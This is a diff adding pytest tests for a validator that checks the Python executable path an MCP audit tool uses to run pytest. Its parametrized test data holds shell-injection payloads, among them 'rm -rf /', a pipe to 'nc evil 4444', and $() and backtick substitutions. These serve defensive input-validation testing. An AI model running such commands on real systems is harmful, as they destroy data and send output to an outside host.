@@ -30,6 +30,7 @@ from iabv_v15.infra.mcp.audit_tools import (
     read_repo_file,
     resolve_workspace_path,
     run_pytest,
+    validate_pytest_executable,
     validate_pytest_keyword,
     validate_pytest_suite,
 )
@@ -275,6 +276,58 @@ def test_validate_pytest_keyword_allows_and_rejects() -> None:
         validate_pytest_keyword("foo`rm -rf`")
 
 
+def test_validate_pytest_executable_none_and_empty() -> None:
+    assert validate_pytest_executable(None) is None
+    assert validate_pytest_executable("") is None
+    assert validate_pytest_executable("   ") is None
+
+
+def test_validate_pytest_executable_accepts_real_python(tmp_path: Path) -> None:
+    fake = tmp_path / "python3.11"
+    fake.write_text("#!/bin/sh\nexit 0\n")
+    fake.chmod(0o755)
+    assert validate_pytest_executable(str(fake)) == str(fake.resolve())
+
+
+def test_validate_pytest_executable_accepts_windows_style(tmp_path: Path) -> None:
+    fake = tmp_path / "python.exe"
+    fake.write_text("binary")
+    assert validate_pytest_executable(str(fake)) == str(fake.resolve())
+
+
+def test_validate_pytest_executable_rejects_missing(tmp_path: Path) -> None:
+    missing = tmp_path / "nope" / "python"
+    with pytest.raises(AuditToolError) as exc:
+        validate_pytest_executable(str(missing))
+    assert exc.value.code == "invalid_python_executable"
+
+
+def test_validate_pytest_executable_rejects_non_python_binary(tmp_path: Path) -> None:
+    fake = tmp_path / "bash"
+    fake.write_text("#!/bin/sh\n")
+    fake.chmod(0o755)
+    with pytest.raises(AuditToolError) as exc:
+        validate_pytest_executable(str(fake))
+    assert exc.value.code == "invalid_python_executable"
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "/usr/bin/python3; rm -rf /",
+        "/usr/bin/python3 && echo pwned",
+        "/usr/bin/python3 | nc evil 4444",
+        "/usr/bin/python3\nls",
+        "$(echo python)",
+        "`echo python`",
+    ],
+)
+def test_validate_pytest_executable_rejects_shell_metachars(payload: str) -> None:
+    with pytest.raises(AuditToolError) as exc:
+        validate_pytest_executable(payload)
+    assert exc.value.code == "invalid_python_executable"
+
+
 # ----------------------------------------------------------------------
 # run_pytest
 
@@ -296,7 +349,15 @@ class _StubRunner:
         return self.result
 
 
+def _make_fake_python(tmp_path: Path, name: str = "python3") -> Path:
+    fake = tmp_path / name
+    fake.write_text("#!/bin/sh\nexit 0\n")
+    fake.chmod(0o755)
+    return fake.resolve()
+
+
 def test_run_pytest_default_suite_passes_expected_cmd(tmp_path: Path) -> None:
+    fake_python = _make_fake_python(tmp_path)
     runner = _StubRunner(
         SubprocessResult(
             returncode=0,
@@ -308,7 +369,7 @@ def test_run_pytest_default_suite_passes_expected_cmd(tmp_path: Path) -> None:
     payload = run_pytest(
         tmp_path,
         runner=runner,
-        python_executable="/fake/python",
+        python_executable=str(fake_python),
     )
     assert payload["suite"] == "tests/"
     assert payload["keyword"] is None
@@ -321,7 +382,7 @@ def test_run_pytest_default_suite_passes_expected_cmd(tmp_path: Path) -> None:
     # cmd esperado
     call = runner.calls[0]
     assert call["cmd"] == [
-        "/fake/python",
+        str(fake_python),
         "-m",
         "pytest",
         "-p",
@@ -335,6 +396,7 @@ def test_run_pytest_default_suite_passes_expected_cmd(tmp_path: Path) -> None:
 
 
 def test_run_pytest_appends_keyword(tmp_path: Path) -> None:
+    fake_python = _make_fake_python(tmp_path)
     runner = _StubRunner(
         SubprocessResult(returncode=1, stdout="0 passed, 1 failed", stderr="", duration_s=0.5)
     )
@@ -343,7 +405,7 @@ def test_run_pytest_appends_keyword(tmp_path: Path) -> None:
         suite="tests/test_mcp_server.py",
         keyword="governance",
         runner=runner,
-        python_executable="/fake/python",
+        python_executable=str(fake_python),
     )
     assert "-k" in runner.calls[0]["cmd"]
     idx = runner.calls[0]["cmd"].index("-k")
@@ -362,6 +424,7 @@ def test_run_pytest_invalid_suite_raises(tmp_path: Path) -> None:
 
 
 def test_run_pytest_timeout_flag(tmp_path: Path) -> None:
+    fake_python = _make_fake_python(tmp_path)
     runner = _StubRunner(
         SubprocessResult(
             returncode=-1,
@@ -371,8 +434,22 @@ def test_run_pytest_timeout_flag(tmp_path: Path) -> None:
             timed_out=True,
         )
     )
-    payload = run_pytest(tmp_path, runner=runner, python_executable="/fake/python")
+    payload = run_pytest(tmp_path, runner=runner, python_executable=str(fake_python))
     assert payload["timed_out"] is True
+
+
+def test_run_pytest_rejects_invalid_python_executable(tmp_path: Path) -> None:
+    runner = _StubRunner(
+        SubprocessResult(returncode=0, stdout="", stderr="", duration_s=0.0)
+    )
+    with pytest.raises(AuditToolError) as exc:
+        run_pytest(
+            tmp_path,
+            runner=runner,
+            python_executable="/usr/bin/python3; rm -rf /",
+        )
+    assert exc.value.code == "invalid_python_executable"
+    assert runner.calls == []
 
 
 # ----------------------------------------------------------------------
